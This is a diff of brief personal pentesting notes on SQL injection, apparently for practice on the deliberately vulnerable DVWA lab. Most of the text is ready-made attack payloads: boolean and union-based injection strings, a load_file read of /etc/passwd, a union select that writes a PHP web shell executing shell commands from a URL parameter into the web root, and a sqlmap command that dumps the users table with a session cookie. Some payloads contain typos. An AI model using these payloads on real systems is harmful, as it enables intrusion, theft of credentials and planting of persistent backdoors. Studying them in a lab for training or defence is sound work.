@@ -130,11 +130,11 @@ file inclusion
 
     php5.X %00 will cut the afterward econtent.   
 
-Spli
+Spli  --input parameter is char 
     ' or 1=1 limit 1;#
 	1' or 1=1 limit 3,1  ;#    #3 is the index of the result got from the DB
 
-	blind injection
+	injection
 		1' order by 3#     #order by    is used to identify the nums of columns of the sheet. if the respnse of 3 is error,
 									the colume is less than 3.
 		union select 1,2#    # 1 and 2 can be functions to enquery info. 
@@ -154,3 +154,9 @@ Spli
 			union select null,load_file('/etc/passwd')#
 		# write a sh on the host
 			union select null,:<?php $var=shell_ecec($GET['cmd']): echo $var ?> INTO DUMPFILE '/var/www/html/shell.php'#
+
+	sqlmap
+		sqlmap -u "http://192.168.0.104/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=sgefsbodcapjoirl8f3t731435" -p id -D dvwa -T users --dump
+			-p schema_name, -T table_name, --dump
+			--schames --tables --columns
+		
